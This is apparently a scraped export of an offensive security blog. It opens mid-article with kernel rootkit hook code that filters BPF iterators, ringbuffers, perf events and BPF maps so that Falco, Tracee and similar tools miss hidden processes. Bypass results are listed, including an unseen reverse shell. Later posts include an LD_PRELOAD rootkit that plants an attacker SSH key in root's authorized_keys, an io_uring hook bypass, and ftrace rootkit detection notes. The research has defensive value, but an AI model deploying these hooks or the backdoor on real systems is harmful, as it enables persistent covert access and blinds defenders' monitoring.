Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system\u0026rsquo;s \u0026ldquo;ground truth\u0026rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can\u0026rsquo;t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: 